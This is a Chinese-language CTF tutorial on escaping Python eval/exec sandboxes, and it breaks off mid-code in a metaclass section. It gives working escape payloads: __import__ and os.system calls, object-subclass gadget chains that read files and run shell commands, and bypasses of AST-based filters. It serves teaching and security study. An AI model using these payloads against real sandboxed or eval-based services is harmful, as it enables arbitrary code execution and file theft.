\u4f46\u662f\u9898\u76ee\u90fd\u4f1a\u7ed9\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u3001\u770b\u8d77\u6765\u4e25\u5bc6\u7684\u9650\u5236\u9632\u6b62\u5e72\u574f\u4e8b \u8fd9\u65f6\u5019\u5c31\u8981\u627e\u65b9\u6cd5\u7ed5\u8fc7\u9650\u5236\u6765\u5e72\u574f\u4e8b\uff0c\u4e5f\u5c31\u662f\u6c99\u7bb1\u9003\u9038 eval \u548c exec \u6709\u4ec0\u4e48\u533a\u522b \u00b6 eval ( expression [, globals [, locals ]]) exec ( expression [, globals [, locals ]]) \u53ef\u4ee5\u770b\u51fa\u5b83\u4eec\u7684\u7528\u6cd5\u5927\u4f53\u76f8\u4f3c\uff0c\u53c2\u6570\u6709\u8981\u6267\u884c\u7684\u8868\u8fbe\u5f0f expression \uff0c\u5168\u5c40\u53d8\u91cf globals \uff08\u5fc5\u987b\u662f\u5b57\u5178\uff09\uff0c\u5c40\u90e8\u53d8\u91cf locals \uff08\u4efb\u610f mapping object\uff0c\u4e00\u822c\u4e5f\u662f\u5b57\u5178\uff09 \u4e0d\u540c\u7684\u662f eval \u628a\u8868\u8fbe\u5f0f\u8ba1\u7b97\u51fa\u6765\uff0c\u628a\u7ed3\u679c\u8fd4\u56de\uff0c\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u73af\u5883 \u800c exec \u628a\u8868\u8fbe\u5f0f\u4f5c\u4e3apy\u8bed\u53e5\u6765\u6267\u884c\uff0c\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\u7b49\u64cd\u4f5c\uff08\u9898\u76ee\u91cc exec \u4e0d\u5e38\u89c1\uff09 eval \u548c exec \u5982\u4f55\u6784\u9020\u6c99\u7bb1 \u00b6 \u53ef\u4ee5\u770b\u51fa\uff0ceval \u548c exec \u90fd\u5305\u542b\u53c2\u6570 globals locals\uff0c\u53ef\u4ee5\u6307\u5b9a\u5b83\u4eec\u4e3a\u7a7a\u5b57\u5178\u4f7f\u5176\u8bbf\u95ee\u4e0d\u5230\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf \u800c\u6bd4\u8f83\u7279\u522b\u7684\u5c31\u662f __builtins__ \uff0c\u5373\u5185\u7f6e\u51fd\u6570\u3002\u5982\u679c globals \u4e2d\u6ca1\u6709\u952e builtins \uff0c\u5219\u4f1a\u81ea\u52a8\u5c06\u5176\u63d2\u5165\uff0c\u800c\u770b\u6587\u6863 https://docs.python.org/3/library/functions.html \u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u6709\u51fd\u6570 open \u548c __import__ \u53ef\u4ee5\u7528\u6765\u5e72\u574f\u4e8b\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u4f20\u5165 globals \u4e3a {'__builtins__': {}} \u4f7f\u5176\u65e0\u6cd5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570 ast.literal_eval \u00b6 \u5373\u4f7f eval \u548c exec \u7ed9\u4e86\u8fd9\u6837\u7684\u9650\u5236\uff0c\u90a3\u80af\u5b9a\u8fd8\u662f\u4f1a\u6709\u6f0f\u6d1e\u7684\uff08\u4e0d\u7136\u5c31\u6ca1\u8fd9\u7bc7\u6587\u7ae0\u4e86\uff09 \u90a3\u6709\u6ca1\u6709\u66f4\u5b89\u5168\u7684 eval\uff1f ast \u6a21\u5757\u4e2d\u7684 literal_eval \u5c31\u4f1a\u66f4\u52a0\u5b89\u5168\uff0c\u76ee\u524d\u8c8c\u4f3c\u5e76\u65e0\u7a81\u7834\u65b9\u6cd5\uff0c\u6240\u4ee5\u9898\u76ee\u91cc\u662f ast.literal_eval \u57fa\u672c\u4e0a\u5c31\u4e0d\u662f\u6c99\u7bb1\u9003\u9038\u4e86_(:\u0437\u300d\u2220)_ \u600e\u4e48\u9003\u9038\uff1f \u00b6 \u4ec5\u68c0\u67e5\u4e86 expression\uff0c\u4f46 eval \u6ca1\u6709\u9650\u5236 \u00b6 \u8fd9\u65f6\u53ea\u8981\u7ed5\u8fc7 expression \u7684\u9650\u5236\u5c31\u53ef\u4ee5\u4e86 \u6bd4\u5982\u8fc7\u6ee4\u4e86 system\u3001open\u3001ls\u3001cat \u7b49\u654f\u611f\u8bcd \u8fd9\u6837\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u6216\u8005\u628a bytes decode \u6210\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7 \u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u5b57\u7b26\u4e32\uff08 ?.__doc__ \uff09\u901a\u8fc7\u7d22\u5f15\u6765\u62fc\u63a5\u6210\u9700\u8981\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u662f\u8fc7\u6ee4\u4e86\u6570\u5b57\u7684\u8bdd\u5219\u53ef\u4ee5\u7528 True\u3001False \uff08\u6216 []==[]\u3001[]<[] \uff09\u6765\u52a0\u51cf\u4e58\u9664\u5f00\u65b9\u79fb\u4f4d\u5f97\u5230\u6570\u5b57 \u6ca1\u6709 import \u00b6 \u53ef\u4ee5\u7528 __import__ \u6765\u624b\u52a8 import\uff0c\u5177\u4f53\uff1a __import__(package) \u5f97\u5230\u7684\u5c31\u662f\u8fd9\u4e2apackage\u3001\u6216\u8005\u7528 importlib.import_module \u6765\u5bfc\u5165\u4e00\u4e2a\u5305 __import__ ( os ) . system ( \"cat flag\" ) importlib . import_module ( \"os\" ); os . system ( \"cat flag\" ) \u4ec5\u6e05\u7a7a\u4e86 __builtins__ \u00b6 \u53ef\u4ee5\u5c1d\u8bd5\u7528 imp.reload \u6216 importlib.reload \u6765\u91cd\u65b0\u5bfc\u5165 __builtins__ eval \u628a\u73af\u5883\u6e05\u7a7a\u4e86 \u00b6 \u627e object \u7684\u5b50\u7c7b \u00b6 python \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7\u4efb\u610f\u4e1c\u897f\u6765\u627e\u5230 object \u8fd9\u4e2a\u7c7b\uff1a [] . __class__ . __base__ [] . __class__ . __bases__ [ 0 ] [] . __class__ . __mro__ [ - 1 ] () . __class__ . __base__ ... {} .... '' .... ... \u7136\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u7c7b\uff1a [] . __class__ . __base__ . __subclasses__ () subclasses ( 0 , < class ' type '>) ( 1 , < class ' weakref '>) ( 2 , < class ' weakcallableproxy '>) ( 3 , < class ' weakproxy '>) ( 4 , < class ' int '>) ( 5 , < class ' bytearray '>) ( 6 , < class ' bytes '>) ( 7 , < class ' list '>) ( 8 , < class ' NoneType '>) ( 9 , < class ' NotImplementedType '>) ( 10 , < class ' traceback '>) ( 11 , < class ' super '>) ( 12 , < class ' range '>) ( 13 , < class ' dict '>) ( 14 , < class ' dict_keys '>) ( 15 , < class ' dict_values '>) ( 16 , < class ' dict_items '>) ( 17 , < class ' dict_reversekeyiterator '>) ( 18 , < class ' dict_reversevalueiterator '>) ( 19 , < class ' dict_reverseitemiterator '>) ( 20 , < class ' odict_iterator '>) ( 21 , < class ' set '>) ( 22 , < class ' str '>) ( 23 , < class ' slice '>) ( 24 , < class ' staticmethod '>) ( 25 , < class ' complex '>) ( 26 , < class ' float '>) ( 27 , < class ' frozenset '>) ( 28 , < class ' property '>) ( 29 , < class ' managedbuffer '>) ( 30 , < class ' memoryview '>) ( 31 , < class ' tuple '>) ( 32 , < class ' enumerate '>) ( 33 , < class ' reversed '>) ( 34 , < class ' stderrprinter '>) ( 35 , < class ' code '>) ( 36 , < class ' frame '>) ( 37 , < class ' builtin_function_or_method '>) ( 38 , < class ' method '>) ( 39 , < class ' function '>) ( 40 , < class ' mappingproxy '>) ( 41 , < class ' generator '>) ( 42 , < class ' getset_descriptor '>) ( 43 , < class ' wrapper_descriptor '>) ( 44 , < class ' method - wrapper '>) ( 45 , < class ' ellipsis '>) ( 46 , < class ' member_descriptor '>) ( 47 , < class ' types . SimpleNamespace '>) ( 48 , < class ' PyCapsule '>) ( 49 , < class ' longrange_iterator '>) ( 50 , < class ' cell '>) ( 51 , < class ' instancemethod '>) ( 52 , < class ' classmethod_descriptor '>) ( 53 , < class ' method_descriptor '>) ( 54 , < class ' callable_iterator '>) ( 55 , < class ' iterator '>) ( 56 , < class ' pickle . PickleBuffer '>) ( 57 , < class ' coroutine '>) ( 58 , < class ' coroutine_wrapper '>) ( 59 , < class ' InterpreterID '>) ( 60 , < class ' EncodingMap '>) ( 61 , < class ' fieldnameiterator '>) ( 62 , < class ' formatteriterator '>) ( 63 , < class ' BaseException '>) ( 64 , < class ' hamt '>) ( 65 , < class ' hamt_array_node '>) ( 66 , < class ' hamt_bitmap_node '>) ( 67 , < class ' hamt_collision_node '>) ( 68 , < class ' keys '>) ( 69 , < class ' values '>) ( 70 , < class ' items '>) ( 71 , < class ' Context '>) ( 72 , < class ' ContextVar '>) ( 73 , < class ' Token '>) ( 74 , < class ' Token . MISSING '>) ( 75 , < class ' moduledef '>) ( 76 , < class ' module '>) ( 77 , < class ' filter '>) ( 78 , < class ' map '>) ( 79 , < class ' zip '>) ( 80 , < class ' _frozen_importlib . _ModuleLock '>) ( 81 , < class ' _frozen_importlib . _DummyModuleLock '>) ( 82 , < class ' _frozen_importlib . _ModuleLockManager '>) ( 83 , < class ' _frozen_importlib . ModuleSpec '>) ( 84 , < class ' _frozen_importlib . BuiltinImporter '>) ( 85 , < class ' classmethod '>) ( 86 , < class ' _frozen_importlib . FrozenImporter '>) ( 87 , < class ' _frozen_importlib . _ImportLockContext '>) ( 88 , < class ' _thread . _localdummy '>) ( 89 , < class ' _thread . _local '>) ( 90 , < class ' _thread . lock '>) ( 91 , < class ' _thread . RLock '>) ( 92 , < class ' _frozen_importlib_external . WindowsRegistryFinder '>) ( 93 , < class ' _frozen_importlib_external . _LoaderBasics '>) ( 94 , < class ' _frozen_importlib_external . FileLoader '>) ( 95 , < class ' _frozen_importlib_external . _NamespacePath '>) ( 96 , < class ' _frozen_importlib_external . _NamespaceLoader '>) ( 97 , < class ' _frozen_importlib_external . PathFinder '>) ( 98 , < class ' _frozen_importlib_external . FileFinder '>) ( 99 , < class ' _io . _IOBase '>) ( 100 , < class ' _io . _BytesIOBuffer '>) ( 101 , < class ' _io . IncrementalNewlineDecoder '>) ( 102 , < class ' posix . ScandirIterator '>) ( 103 , < class ' posix . DirEntry '>) ( 104 , < class ' zipimport . zipimporter '>) ( 105 , < class ' zipimport . _ZipImportResourceReader '>) ( 106 , < class ' codecs . Codec '>) ( 107 , < class ' codecs . IncrementalEncoder '>) ( 108 , < class ' codecs . IncrementalDecoder '>) ( 109 , < class ' codecs . StreamReaderWriter '>) ( 110 , < class ' codecs . StreamRecoder '>) ( 111 , < class ' _abc_data '>) ( 112 , < class ' abc . ABC '>) ( 113 , < class ' dict_itemiterator '>) ( 114 , < class ' collections . abc . Hashable '>) ( 115 , < class ' collections . abc . Awaitable '>) ( 116 , < class ' collections . abc . AsyncIterable '>) ( 117 , < class ' async_generator '>) ( 118 , < class ' collections . abc . Iterable '>) ( 119 , < class ' bytes_iterator '>) ( 120 , < class ' bytearray_iterator '>) ( 121 , < class ' dict_keyiterator '>) ( 122 , < class ' dict_valueiterator '>) ( 123 , < class ' list_iterator '>) ( 124 , < class ' list_reverseiterator '>) ( 125 , < class ' range_iterator '>) ( 126 , < class ' set_iterator '>) ( 127 , < class ' str_iterator '>) ( 128 , < class ' tuple_iterator '>) ( 129 , < class ' collections . abc . Sized '>) ( 130 , < class ' collections . abc . Container '>) ( 131 , < class ' collections . abc . Callable '>) ( 132 , < class ' os . _wrap_close '>) ( 133 , < class ' _sitebuiltins . Quitter '>) ( 134 , < class ' _sitebuiltins . _Printer '>) ( 135 , < class ' _sitebuiltins . _Helper '>) ( 136 , < class ' types . DynamicClassAttribute '>) ( 137 , < class ' types . _GeneratorWrapper '>) ( 138 , < class ' warnings . WarningMessage '>) ( 139 , < class ' warnings . catch_warnings '>) ( 140 , < class ' importlib . abc . Finder '>) ( 141 , < class ' importlib . abc . Loader '>) ( 142 , < class ' importlib . abc . ResourceReader '>) ( 143 , < class ' operator . itemgetter '>) ( 144 , < class ' operator . attrgetter '>) ( 145 , < class ' operator . methodcaller '>) ( 146 , < class ' itertools . accumulate '>) ( 147 , < class ' itertools . combinations '>) ( 148 , < class ' itertools . combinations_with_replacement '>) ( 149 , < class ' itertools . cycle '>) ( 150 , < class ' itertools . dropwhile '>) ( 151 , < class ' itertools . takewhile '>) ( 152 , < class ' itertools . islice '>) ( 153 , < class ' itertools . starmap '>) ( 154 , < class ' itertools . chain '>) ( 155 , < class ' itertools . compress '>) ( 156 , < class ' itertools . filterfalse '>) ( 157 , < class ' itertools . count '>) ( 158 , < class ' itertools . zip_longest '>) ( 159 , < class ' itertools . permutations '>) ( 160 , < class ' itertools . product '>) ( 161 , < class ' itertools . repeat '>) ( 162 , < class ' itertools . groupby '>) ( 163 , < class ' itertools . _grouper '>) ( 164 , < class ' itertools . _tee '>) ( 165 , < class ' itertools . _tee_dataobject '>) ( 166 , < class ' reprlib . Repr '>) ( 167 , < class ' collections . deque '>) ( 168 , < class ' _collections . _deque_iterator '>) ( 169 , < class ' _collections . _deque_reverse_iterator '>) ( 170 , < class ' _collections . _tuplegetter '>) ( 171 , < class ' collections . _Link '>) ( 172 , < class ' functools . partial '>) ( 173 , < class ' functools . _lru_cache_wrapper '>) ( 174 , < class ' functools . partialmethod '>) ( 175 , < class ' functools . singledispatchmethod '>) ( 176 , < class ' functools . cached_property '>) ( 177 , < class ' contextlib . ContextDecorator '>) ( 178 , < class ' contextlib . _GeneratorContextManagerBase '>) ( 179 , < class ' contextlib . _BaseExitStack '>) ( 180 , < class ' rlcompleter . Completer '>) \u641e\u4e8b \u00b6 \u53ef\u4ee5\u5c1d\u8bd5\u4ece\u67d0\u4e9b\u7c7b\u7684 __init__ \u91cc\u9762\u641e\u5230 __globals__ \uff0c\u6bd4\u5982\uff1a [] . __class__ . __base__ . __subclasses__ ()[ - 2 ] . __init__ . __globals__ [ 'sys' ] . modules [ 'os' ] . system ( \"cat flag\" ) \u4e5f\u53ef\u4ee5\u5229\u7528\u5b50\u7c7b\u91cc\u9762\u7684\u5371\u9669\u7c7b\uff1a ( 37 , < class ' builtin_function_or_method '>) ( 94 , < class ' _frozen_importlib_external . FileLoader '>) ( 132 , < class ' os . _wrap_close '>) \u6bd4\u5982\uff1a [] . __class__ . __base__ . __subclasses__ ()[ 94 ] . get_data ( \"\" , \"flag\" ) [] . __class__ . __base__ . __subclasses__ ()[ 132 ] . close . __globals__ [ \"system\" ]( \"cat flag\" ) python2 \u91cc\u8fd8\u6709 file \u53ef\u4ee5\u76f4\u63a5 open \u7ed5\u8fc7 AST \u68c0\u6d4b \u00b6 \u5177\u4f53\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u5217\u51fa\u4e00\u6761\uff0c\u89c1\u4e0b\u9762 \u7ed5\u8fc7 AST \u68c0\u6d4b\u9003\u9038 \u00b6 \u8fd9\u7c7b\u9898\u76ee\u4e0d\u50cf\u666e\u901a\u7684\u6c99\u7bb1\u9003\u9038\u4e00\u6837\u901a\u8fc7\u5220\u9664\u5185\u7f6e\u51fd\u6570\u5b57\u5178\u6216\u8005\u5220\u9664\u67d0\u4e9b\u6a21\u5757\u7684\u5185\u5bb9\u6765\u5b9e\u73b0 \u800c\u662f\u5728\u8f93\u5165\u547d\u4ee4\u540e\u5373\u4f7f\u7528python\u7684 ast \u6a21\u5757\u5bf9\u5176\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u53ea\u8981\u4f7f\u7528\u4e86\u67d0\u4e9b\u7981\u6b62\u7684\u62bd\u8c61\u8bed\u6cd5\uff0c\u5c31\u629b\u51fa\u5f02\u5e38\u5bfc\u81f4\u7a0b\u5e8f\u4e2d\u65ad \u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528 ast.parse \u5206\u6790\u4e86\u8bed\u6cd5\uff0c\u6240\u4ee5\u5f88\u96be\u8499\u6df7\u8fc7\u5173\u9a97\u8fc7 ast\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bfb\u627e\u9898\u76ee\u4e2d\u904d\u5386\u8bed\u6cd5\u6811\u7684\u6f0f\u6d1e\u4e86 \u5148\u6765\u770b\u770b cy \u7684 pysandbox13\uff0c\u8fd9\u4e2a\u6700\u7ec8\u7248\u7684 AST \u68c0\u67e5\u7ed5\u8fc7 \u9898\u76ee\u4ee3\u7801 dbgprint = sys . stderr . write class Traversal (): def __init__ ( self , node ): self . tisiv ( node ) depth = - 1 def tisiv ( self , nodes ): if not isinstance ( nodes , list ): nodes = [ nodes ] self . depth += 1 for node in nodes : func = getattr ( self , 'tisiv_' + node . __class__ . __name__ , None ) if func : dbgprint ( \" \" * self . depth + \"tisiv\" [:: - 1 ] + \" \\t \" + node . __class__ . __name__ + \" \\n \" ) return func ( node ) else : if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) self . depth -= 1 def tisiv_Call ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . func ) self . tisiv ( node . args ) self . tisiv ( node . keywords ) def tisiv_Attribute ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . value ) self . tisiv ( node . attr ) self . tisiv ( node . ctx ) def tisiv_Import ( self , node ): raise Exception ( \"not allowed\" ) def tisiv_Module ( self , node ): self . tisiv ( node . body ) def tisiv_BoolOp ( self , node ): self . tisiv ( node . values ) def tisiv_BinOp ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . right ) def tisiv_UnaryOp ( self , node ): self . tisiv ( node . operand ) def tisiv_Lambda ( self , node ): self . tisiv ( node . body ) self . tisiv ( node . args ) def tisiv_IfExp ( self , node ): self . tisiv ( node . test ) self . tisiv ( node . body ) self . tisiv ( node . orelse ) def tisiv_Dict ( self , node ): self . tisiv ( node . keys ) self . tisiv ( node . values ) def tisiv_Set ( self , node ): self . tisiv ( node . elts ) def tisiv_ListComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_SetComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_DictComp ( self , node ): self . tisiv ( node . key ) self . tisiv ( node . value ) self . tisiv ( node . generators ) def tisiv_GeneratorExp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_Yield ( self , node ): self . tisiv ( node . value ) def tisiv_Compare ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . comparators ) def tisiv_Repr ( self , node ): self . tisiv ( node . value ) def tisiv_Subscript ( self , node ): self . tisiv ( node . value ) self . tisiv ( node . slice ) def tisiv_List ( self , node ): self . tisiv ( node . elts ) def tisiv_Tuple ( self , node ): self . tisiv ( node . elts ) def tisiv_Expr ( self , node ): self . tisiv ( node . value ) def tisiv_JoinedStr ( self , node ): self . tisiv ( node . values ) def tisiv_NameConstant ( self , node ): pass Traversal ( ast . parse ( c )) \u53ef\u4ee5\u8bfb\u51fa\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a Traversal \u7c7b\uff0c\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u5bf9\u4f20\u5165\u7684\u8282\u70b9\u8c03\u7528 tisiv \u65b9\u6cd5\uff0c\u5373\u5bf9\u5176\u6240\u6709\u5b50\u8282\u70b9\u7ee7\u7eed\u9010\u5c42\u68c0\u67e5 \u5982\u679c tisiv_{\u8be5\u8282\u70b9\u7c7b\u540d} \u5df2\u7ecf\u6709\u4e86\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u5c31\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u4e9b\u65b9\u6cd5\u4e2d\u53c8\u5206\u522b\u5bf9\u5176\u5b50\u8282\u70b9\u8fdb\u884c\u4e86\u68c0\u67e5 \u5982\u679c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u65b9\u6cd5\uff0c\u5c31\u68c0\u6d4b\u8fd9\u4e2a\u8282\u70b9\u7684\u8bed\u6cd5\u7c7b\u578b\u662f\u4e0d\u662f ast.expr\uff0c\u5982\u679c\u4e0d\u662f\u5c31\u76f4\u63a5\u7981\u6b62 \u518d\u770b TokyoWesterns CTF 4th 2018 \u7684\u4e00\u9053\u9898\uff1a \u9898\u76ee\u4ee3\u7801 def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' , 'generators' ], 'SetComp' : [ 'elt' , 'generators' ], 'DictComp' : [ 'key' , 'value' , 'generators' ], 'GeneratorExp' : [ 'elt' , 'generators' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node 'comprehension' : [ 'target' , 'iter' , 'ifs' ], } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . readline () body = ast . parse ( expr ) . body \u8fd9\u9053\u9898\u76ee\u7684\u4ee3\u7801\u5c31\u66f4\u52a0\u660e\u786e\u4e86\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684 \u6b63\u5982\u524d\u9762\u8bf4\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u68c0\u67e5\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e \u5bfb\u627e\u6ca1\u6709\u904d\u5386\u5230\u7684\u5b50\u8282\u70b9 \u00b6 \u6211\u4eec\u53d1\u73b0\uff0c\u5728\u9898\u76ee\u7684\u7a0b\u5e8f\u4e2d\uff0c\u90fd\u662f\u624b\u52a8\u7f16\u5199\u4e86\u5bf9\u67d0\u4e2a\u62bd\u8c61\u8bed\u6cd5\u7684\u54ea\u4e9b\u90e8\u5206\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u4f1a\u51fa\u73b0\u67d0\u4e2a\u8bed\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206\u6ca1\u88ab\u68c0\u6d4b\u5230\u7684\u60c5\u51b5\u3002 \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u53bb\u548c AST \u6587\u6863\u4e2d\u62bd\u8c61\u8bed\u6cd5 \u5bf9\u6bd4\uff0c\u6587\u6863\u4e2d\u7ed9\u51fa\u7684 ast.expr \u5305\u542b\u4e86\uff1a expr = BoolOp ( boolop op , expr * values ) | NamedExpr ( expr target , expr value ) | BinOp ( expr left , operator op , expr right ) | UnaryOp ( unaryop op , expr operand ) | Lambda ( arguments args , expr body ) | IfExp ( expr test , expr body , expr orelse ) | Dict ( expr * keys , expr * values ) | Set ( expr * elts ) | ListComp ( expr elt , comprehension * generators ) | SetComp ( expr elt , comprehension * generators ) | DictComp ( expr key , expr value , comprehension * generators ) | GeneratorExp ( expr elt , comprehension * generators ) -- the grammar constrains where yield expressions can occur | Await ( expr value ) | Yield ( expr ? value ) | YieldFrom ( expr value ) -- need sequences for compare to distinguish between -- x < 4 < 3 and (x < 4) < 3 | Compare ( expr left , cmpop * ops , expr * comparators ) | Call ( expr func , expr * args , keyword * keywords ) | FormattedValue ( expr value , int ? conversion , expr ? format_spec ) | JoinedStr ( expr * values ) | Constant ( constant value , string ? kind ) -- the following expression can appear in assignment context | Attribute ( expr value , identifier attr , expr_context ctx ) | Subscript ( expr value , expr slice , expr_context ctx ) | Starred ( expr value , expr_context ctx ) | Name ( identifier id , expr_context ctx ) | List ( expr * elts , expr_context ctx ) | Tuple ( expr * elts , expr_context ctx ) -- can appear only in Subscript | Slice ( expr ? lower , expr ? upper , expr ? step ) \u6bd4\u5982\uff0cBinOp(expr left, operator op, expr right) \u8868\u793a\u4e86\u4e8c\u5143\u8fd0\u7b97\u8fd9\u4e2a\u8bed\u6cd5\uff0cleft \u8868\u793a\u5de6\u4fa7\u7684\u8868\u8fbe\u5f0f\uff0cop \u8868\u793a\u4e8c\u5143\u8fd0\u7b97\u7b26\uff0cright \u8868\u793a\u53f3\u4fa7\u8868\u8fbe\u5f0f\u3002 \u540c\u7406 ListComp(expr elt, comprehension* generators) \u4e2d elt \u8868\u793a\u5176\u4e2d\u5217\u8868\u63a8\u5bfc\u7684\u5143\u7d20\uff0c\u800c generator \u5219\u8868\u793a\u751f\u6210\u5668\u5b50\u53e5 \u518d\u6765\u770b TWCTF \u8fd9\u9053\u9898\uff0c\u5b83\u7684\u68c0\u67e5\u4e2d\u5199\u4e86\uff1a 'Subscript' : [ 'value' ], \u800c\u6587\u6863\u4e2d\u7ed9\u7684\u7d22\u5f15\u8bbf\u95ee\u662f Subscript(expr value, expr slice, expr_context ctx) \u56e0\u6b64\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u5e76\u6ca1\u6709\u68c0\u6d4b\u7d22\u5f15\u8bbf\u95ee\u4e2d\u7684\u5207\u7247 slice\uff0c\u8fd9\u6837\u4f8b\u5982 a[...] \u4e2d\u7684 ... \u90e8\u5206\u5c31\u4f1a\u88ab\u5168\u90e8\u5ffd\u7565 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5728[]\u4e2d\u85cf\u4e00\u4e2aeval\u6267\u884c\u6211\u4eec\u60f3\u8981\u7684\u529f\u80fd \u5bfb\u627e\u6ca1\u6709\u68c0\u67e5\u7684\u8282\u70b9 \u00b6 \u518d\u6765\u770b zjusec \u8fd9\u9053\u9898\uff0c\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u53d1\u73b0\u6240\u6709\u68c0\u6d4b\u7684\u8282\u70b9\u7684\u5b50\u8282\u70b9\u4e5f\u90fd\u904d\u5386\u4e86 \u4f46\u662f\u518d\u7ec6\u770b\u53ef\u4ee5\u53d1\u73b0 FormattedValue \u8fd9\u4e2a\u8282\u70b9\u5e76\u6ca1\u6709\u5728\u9898\u76ee\u4ee3\u7801\u91cc\u51fa\u73b0 \u800c\u4e14 ast.FormattedValue \u5c5e\u4e8e ast.expr\uff0c\u6240\u4ee5\u5b83\u65e2\u4e0d\u4f1a\u88ab\u68c0\u67e5\uff0c\u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 \u770b\u540d\u5b57\u50cf\u662f f-string \u76f8\u5173\uff0c\u53ef\u4ee5 dump \u4e00\u4e0b\u770b\u770b\uff1a >>> ast . dump ( ast . parse ( \"f' {x} '\" )) \"\"\" Module( body=[ Expr( value=JoinedStr( values=[ FormattedValue( value=Name(id='x', ctx=Load()), conversion=-1, format_spec=None ) ] ) ], type_ignores=[] ) \"\"\" \u53ef\u4ee5\u53d1\u73b0\uff0cf-string \u662f JoinedStr\uff0c\u800c FormattedValue \u662f\u5176\u4e2d\u88ab\u683c\u5f0f\u5316\u7684\u90e8\u5206 \u6240\u4ee5\u5c31\u53ef\u4ee5\u5411 f-string \u7684 {} \u90e8\u5206\u85cf eval \u6765\u5e72\u574f\u4e8b\u4e86 \u5176\u4ed6\u6f0f\u6d1e \u00b6 \u8fd9\u4e2a\u662f pysandbox12 \u7684\u4e00\u79cd\u89e3\u6cd5 python\u4e2d\u7684\u8bed\u6cd5\u4e0d\u4ec5\u6709 ast.expr \u4e00\u79cd\uff0c\u800c\u4e14\u5f88\u7279\u522b\u7684\u662f\uff0c\u5217\u8868\u63a8\u5bfc ListComp \u7684\u751f\u6210\u5668\u5b50\u53e5\u5e76\u4e0d\u662f ast.expr\uff0c\u800c\u662f ast.comprehension >>> ast . dump ( ast . parse ( \"[x for x in range(n)]\" )) \"\"\" Module( body=[ Expr( value=ListComp( elt=Name(id='x', ctx=Load()), generators=[ comprehension( target=Name(id='x', ctx=Store()), iter=Call( func=Name(id='range', ctx=Load()), args=[Name(id='n', ctx=Load())], keywords=[] ), ifs=[], is_async=0 ) ] ) ) ], type_ignores=[] ) \"\"\" \u4f46\u662f pysandbox13 \u8fd9\u6837\u6392\u9664\u4e86 ast.expr \uff1a if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) \u4f46\u662f12\u9898\u4e2d\u5e76\u6ca1\u6709\uff0c\u6240\u4ee5 ast.comprehension \u8fd9\u4e2a\u7c7b\u578b\u5b8c\u5168\u6ca1\u6709\u88ab\u68c0\u67e5 \u56e0\u6b64\u76f4\u63a5\u5411\u751f\u6210\u5668\u8868\u8fbe\u5f0f\u4e2d\u63d2\u5165\u574f\u4e1c\u897f\u5373\u53ef\uff1a [x for x in [eval(...)]] \u5176\u4ed6\u7c7b\u578b\u7684\u9003\u9038 \u00b6 \u5177\u4f53\u95ee\u9898\u5177\u4f53\u5206\u6790\u4e86 metaclass \u00b6 Balsn CTF 2021 \u51fa\u4e86\u4e00\u9053\u7c7b\u4f3c\u6c99\u7bb1\u9003\u9038\u7684\u9898\u76ee\uff0c\u4e3b\u8981\u8003\u5bdf\u7684\u662f metaclass \u9898\u76ee\u4ee3\u7801 class MasterMetaClass ( type ): def __new__ ( cls , class_name , class_parents , class_attr ): def getFlag ( self ): print ( 'Here you go, my master' ) with open ( 'flag' ) as f : print ( f . read ()) class_attr [ getFlag . __name__ ] = getFlag attrs = (( name , value ) 